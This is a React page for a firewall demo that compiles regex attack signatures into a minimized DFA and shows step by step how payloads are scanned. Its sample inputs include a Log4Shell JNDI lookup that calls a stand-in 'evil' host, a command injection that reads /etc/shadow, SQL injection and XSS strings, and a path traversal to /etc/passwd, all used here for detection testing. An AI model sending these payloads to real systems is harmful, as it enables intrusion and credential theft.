// @ts-nocheck -- SVG layout index math
import { createFileRoute } from "@tanstack/react-router";
import { useMemo, useState, useEffect } from "react";
import { compile, scan, OTHER, type Rule, type DFA } from "@/lib/automata";
import { LIBRARY } from "@/lib/signatures";
const MAX = 30;

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "RegexViz — Attributed MDFA Firewall Demo" },
      { name: "description", content: "Interactive demo: regex rules compiled to an attributed minimized DFA for linear-time, ReDoS-immune payload inspection." },
      { property: "og:title", content: "RegexViz — Attributed MDFA Firewall Demo" },
      { property: "og:description", content: "Shunting-Yard → Thompson → Subset → Attributed Hopcroft, plus a live stream debugger." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: Index,
});

const DEFAULT: Rule[] = ["SQL Injection", "SQL Injection (UNION)", "XSS (Script Tag)", "Path Traversal", "Command Injection", "Log4Shell (JNDI)"]
  .map((n, id) => { const s = LIBRARY.find((x) => x.name === n)!; return { id, name: s.name, pattern: s.pattern }; });
const CATS = [...new Set(LIBRARY.map((s) => s.category))];
const SAMPLES = ["x=${jndi:ldap://evil/a}", "host=1;cat /etc/shadow", "id=0x1f; sleep(5)", "GET /search?q=hello+world", "user=admin' OR 1=1 --", "comment=<SCRIPT>alert(1)</script>", "file=../../etc/passwd", "q=1 UNION   SELECT pwd"];
const COLORS = ["var(--rule-0)", "var(--rule-1)", "var(--rule-2)", "var(--rule-3)", "var(--rule-4)", "var(--rule-5)"];

const ruleNames = (mask: number, rules: Rule[]) => rules.filter((r) => mask & (1 << r.id)).map((r) => r.name);

function Graph({ m, active, rules, title }: { m: DFA; active?: number; rules: Rule[]; title: string }) {
  const W = 560, H = 360, R = Math.min(W, H) / 2 - 40;
  const pos = Array.from({ length: m.n }, (_, i) => {
    const a = (i / m.n) * Math.PI * 2 - Math.PI / 2;
    return [W / 2 + R * Math.cos(a), H / 2 + R * Math.sin(a)];
  });
  const edges = new Map<string, string[]>();
  m.delta.forEach((row, s) => row.forEach((t, a) => {
    if (t === m.start && s !== m.start) return; // hide fallback edges for clarity
    const k = `${s}-${t}`; (edges.get(k) ?? edges.set(k, []).get(k)!).push(m.alphabet[a]);
  }));
  return (
    <div className="panel">
      <div className="mb-2 flex justify-between text-xs text-muted-foreground"><span className="font-mono uppercase tracking-widest">{title}</span><span>{m.n} states · fallback→q0 edges hidden</span></div>
      <svg viewBox={`0 0 ${W} ${H}`} className="w-full">
        <defs><marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0L10 5L0 10z" fill="var(--muted-foreground)" /></marker></defs>
        {[...edges].map(([k, syms]) => {
          const [s, t] = k.split("-").map(Number);
          const label = syms.length > 4 ? `${syms.length} sym` : syms.join(",");
          if (s === t) { const [x, y] = pos[s]; return <g key={k}><path d={`M${x - 8} ${y - 16} C ${x - 30} ${y - 55}, ${x + 30} ${y - 55}, ${x + 8} ${y - 16}`} fill="none" stroke="var(--muted-foreground)" strokeOpacity=".5" markerEnd="url(#ar)" /><text x={x} y={y - 50} className="edge-label" textAnchor="middle">{label}</text></g>; }
          const [x1, y1] = pos[s], [x2, y2] = pos[t]; const dx = x2 - x1, dy = y2 - y1, L = Math.hypot(dx, dy);
          const ux = dx / L, uy = dy / L, mx = (x1 + x2) / 2 - uy * 18, my = (y1 + y2) / 2 + ux * 18;
          return <g key={k}><path d={`M${x1 + ux * 16} ${y1 + uy * 16} Q ${mx} ${my} ${x2 - ux * 18} ${y2 - uy * 18}`} fill="none" stroke="var(--muted-foreground)" strokeOpacity=".5" markerEnd="url(#ar)" /><text x={mx} y={my} className="edge-label" textAnchor="middle">{label}</text></g>;
        })}
        {pos.map(([x, y], i) => {
          const mask = m.mask[i], rid = mask > 0 ? rules.findIndex((r) => mask & (1 << r.id)) : -1;
          const fill = mask === -1 ? "var(--destructive)" : rid >= 0 ? COLORS[rid % COLORS.length] : "var(--card)";
          return <g key={i}>
            <circle cx={x} cy={y} r={16} fill={fill} stroke={i === active ? "var(--primary)" : "var(--border-strong)"} strokeWidth={i === active ? 4 : 1.5} />
            {mask !== 0 && <circle cx={x} cy={y} r={12} fill="none" stroke="var(--background)" />}
            <text x={x} y={y + 4} textAnchor="middle" className="node-label">q{i}</text>
          </g>;
        })}
      </svg>
    </div>
  );
}

function Index() {
  const [rules, setRules] = useState<Rule[]>(DEFAULT);
  const [payload, setPayload] = useState<string>(SAMPLES[1]!);
  const [step, setStep] = useState(0);
  const [playing, setPlaying] = useState(false);
  const [log, setLog] = useState<{ p: string; ok: boolean; info: string }[]>([]);

  const compiled = useMemo(() => { try { return { c: compile(rules), err: "" }; } catch (e) { return { c: null, err: (e as Error).message }; } }, [rules]);
  const c = compiled.c;
  const result = useMemo(() => (c ? scan(c.mdfa, payload) : null), [c, payload]);
  const total = result?.steps.length ?? 0;

  useEffect(() => setStep(0), [payload, rules]);
  useEffect(() => {
    if (!playing) return;
    if (step >= total) { setPlaying(false); return; }
    const t = setTimeout(() => setStep((s) => s + 1), 180);
    return () => clearTimeout(t);
  }, [playing, step, total]);

  const cur = result && step > 0 ? result.steps[step - 1] : null;
  const activeState = cur ? cur.to : 0;
  const done = result && step >= total;

  const inspect = () => {
    if (!result) return;
    setStep(total);
    setLog((l) => [{ p: payload, ok: !result.blocked, info: result.blocked ? `${ruleNames(result.mask, rules).join(", ")} @ index ${result.index}` : "forwarded to server" }, ...l].slice(0, 8));
  };

  const [cat, setCat] = useState("All");
  const has = (n: string) => rules.some((r) => r.name === n);
  const setAll = (list: { name: string; pattern: string }[]) => setRules(list.slice(0, MAX).map((x, id) => ({ id, name: x.name, pattern: x.pattern })));
  const toggle = (sig: { name: string; pattern: string }) => has(sig.name) ? (rules.length > 1 && setAll(rules.filter((r) => r.name !== sig.name))) : rules.length < MAX && setAll([...rules, sig]);
  const updateRule = (i: number, k: "name" | "pattern", v: string) => setRules((rs) => rs.map((r, j) => (j === i ? { ...r, [k]: v } : r)));

  return (
    <main className="min-h-screen px-4 py-10 md:px-10">
      <header className="mx-auto max-w-6xl">
        <p className="font-mono text-xs uppercase tracking-[0.3em] text-primary">RegexViz · Demo Workflow</p>
        <h1 className="mt-2 font-display text-4xl md:text-5xl">Attributed MDFA Firewall Engine</h1>
        <p className="mt-3 max-w-2xl text-muted-foreground">Compile attack signatures offline, then inspect live payloads in strict O(N) — no backtracking, no ReDoS, and every block names the exact rule.</p>
      </header>

      <div className="mx-auto mt-10 grid max-w-6xl gap-6">
        {/* STEP 1 */}
        <section className="panel">
          <h2 className="step-title"><span>01</span> Define attack signatures</h2>
          <p className="text-xs text-muted-foreground">Signature library: {LIBRARY.length} rules across {CATS.length} categories. Pick up to {MAX} active rules. Supports literals, [a-z] classes, ( ), |, *, +, ?, . (any), and \\ escapes. Case-insensitive.</p>
          <div className="mt-3 flex flex-wrap gap-2">
            {["All", ...CATS].map((k) => <button key={k} className="chip" style={cat === k ? { borderColor: "var(--primary)", color: "var(--primary)" } : undefined} onClick={() => setCat(k)}>{k} ({k === "All" ? LIBRARY.length : LIBRARY.filter((s) => s.category === k).length})</button>)}
          </div>
          <div className="mt-3 max-h-64 overflow-y-auto rounded-lg border border-border">
            <table className="w-full text-xs"><tbody>
              {LIBRARY.filter((s) => cat === "All" || s.category === cat).map((s) => (
                <tr key={s.name} className="border-b border-border/50 cursor-pointer hover:bg-muted/40" onClick={() => toggle(s)}>
                  <td className="p-2"><input type="checkbox" readOnly checked={has(s.name)} /></td>
                  <td className="p-2 font-medium">{s.name}</td>
                  <td className="p-2 font-mono text-primary">{s.pattern}</td>
                  <td className="p-2 text-muted-foreground hidden md:table-cell">{s.description}</td>
                </tr>))}
            </tbody></table>
          </div>
          <div className="mt-2 flex flex-wrap gap-2 text-xs">
            <span className="text-muted-foreground self-center">{rules.length}/{MAX} active</span>
            {cat !== "All" && <button className="btn-ghost" onClick={() => setAll(LIBRARY.filter((s) => s.category === cat))}>Use only {cat}</button>}
            <button className="btn-ghost" onClick={() => setAll(DEFAULT)}>Reset defaults</button>
          </div>
          <p className="mt-4 font-mono text-xs uppercase tracking-widest text-muted-foreground">Active rules</p>
          <div className="mt-4 grid gap-2">
            {rules.map((r, i) => (
              <div key={r.id} className="flex gap-2">
                <span className="mt-2 h-3 w-3 shrink-0 rounded-full" style={{ background: COLORS[i % COLORS.length] }} />
                <input className="field w-48" value={r.name} onChange={(e) => updateRule(i, "name", e.target.value)} />
                <input className="field flex-1 font-mono" value={r.pattern} onChange={(e) => updateRule(i, "pattern", e.target.value)} />
                <button className="btn-ghost" onClick={() => setRules((rs) => rs.filter((_, j) => j !== i).map((r, id) => ({ ...r, id })))} disabled={rules.length <= 1}>✕</button>
              </div>
            ))}
          </div>
          {rules.length < MAX && <button className="btn-ghost mt-3" onClick={() => setRules((rs) => [...rs, { id: Math.max(...rs.map((x) => x.id)) + 1, name: "New rule", pattern: "evil" }])}>+ Add rule</button>}
          {compiled.err && <p className="mt-3 text-sm text-destructive">⚠ {compiled.err}</p>}
        </section>

        {c && <>
          {/* STEP 2 */}
          <section className="panel">
            <h2 className="step-title"><span>02</span> Compilation phase (offline)</h2>
            <div className="mt-4 grid gap-3 md:grid-cols-4">
              <div className="stage"><p className="stage-k">Shunting-Yard</p><p className="stage-v">postfix</p>
                {c.postfix.map((p, i) => <code key={i} className="block truncate text-xs text-muted-foreground">{p}</code>)}</div>
              <div className="stage"><p className="stage-k">Thompson ε-NFA</p><p className="stage-v">{c.nfa.n} states</p><p className="text-xs text-muted-foreground">{c.nfa.trans.length} transitions, {c.nfa.trans.filter((t) => t.sym === null).length} ε</p></div>
              <div className="stage"><p className="stage-k">Subset construction</p><p className="stage-v">{c.dfa.n} states</p><p className="text-xs text-muted-foreground">alphabet |Σ| = {c.alphabet.length} (incl. {OTHER} other)</p></div>
              <div className="stage stage-hi"><p className="stage-k">Attributed Hopcroft</p><p className="stage-v">{c.mdfa.n} states</p><p className="text-xs text-muted-foreground">{Math.round((1 - c.mdfa.n / c.dfa.n) * 100)}% compression · {c.mdfa.rounds} refinement rounds</p></div>
            </div>
            <div className="mt-4 grid gap-3 md:grid-cols-2 text-sm">
              <div className="rounded-lg border border-destructive/40 p-3"><b className="text-destructive">Classic minimization:</b> {c.classic.n} states, all alarms merged → {c.classic.mask.filter((x) => x).length} anonymous accept state(s). Rule identity lost.</div>
              <div className="rounded-lg border border-primary/50 p-3"><b className="text-primary">Attributed minimization:</b> {c.mdfa.n} states, {c.mdfa.mask.filter((x) => x).length} accept states each tagged with a rule bitmask. Identity preserved.</div>
            </div>
          </section>

          {/* STEP 3 */}
          <section className="grid gap-6 lg:grid-cols-2">
            <Graph m={c.mdfa} active={activeState} rules={rules} title="Attributed MDFA" />
            <Graph m={c.classic} rules={rules} title="Classic MDFA (for comparison)" />
          </section>

          {/* STEP 4 */}
          <section className="panel">
            <h2 className="step-title"><span>03</span> Inspection phase (live stream)</h2>
            <div className="mt-3 flex flex-wrap gap-2">
              {SAMPLES.map((s) => <button key={s} className="chip" onClick={() => setPayload(s)}>{s}</button>)}
            </div>
            <input className="field mt-3 w-full font-mono" value={payload} onChange={(e) => setPayload(e.target.value)} />
            <div className="mt-3 flex flex-wrap gap-2">
              <button className="btn-primary" onClick={() => { if (step >= total) setStep(0); setPlaying(true); }}>▶ Stream step-by-step</button>
              <button className="btn-ghost" onClick={() => setStep((s) => Math.min(total, s + 1))}>Step +1</button>
              <button className="btn-ghost" onClick={() => { setPlaying(false); setStep(0); }}>Reset</button>
              <button className="btn-ghost" onClick={inspect}>Instant verdict</button>
            </div>

            <div className="mt-4 flex flex-wrap font-mono text-sm">
              {payload.split("").map((ch, i) => {
                const scanned = result && i < step, hit = result?.blocked && i === result.index && scanned, beyond = result?.blocked && i > result.index;
                return <span key={i} className={`char ${scanned ? "char-scanned" : ""} ${hit ? "char-hit" : ""} ${beyond ? "opacity-30" : ""}`}>{ch === " " ? "␣" : ch}</span>;
              })}
            </div>
            {cur && <p className="mt-2 font-mono text-xs text-muted-foreground">δ(q{cur.from}, '{cur.ch}') → q{cur.to} · step {step}/{total}</p>}

            {done && result && (
              <div className={`mt-4 rounded-lg p-4 ${result.blocked ? "verdict-block" : "verdict-pass"}`}>
                {result.blocked
                  ? <><b>⛔ DROPPED</b> — matched <b>{ruleNames(result.mask, rules).join(", ")}</b> at character index <b>{result.index}</b>. Scanned {result.index + 1} chars, zero backtracking.</>
                  : <><b>✓ FORWARDED</b> — {payload.length} chars scanned in {payload.length} transitions. Packet sent to server.</>}
              </div>
            )}
          </section>

          {log.length > 0 && <section className="panel">
            <h2 className="step-title"><span>04</span> Proxy log</h2>
            <ul className="mt-3 space-y-1 font-mono text-xs">
              {log.map((l, i) => <li key={i}><span className={l.ok ? "text-primary" : "text-destructive"}>{l.ok ? "PASS" : "DROP"}</span> <span className="text-muted-foreground">{l.p}</span> → {l.info}</li>)}
            </ul>
          </section>}
        </>}
      </div>
    </main>
  );
}
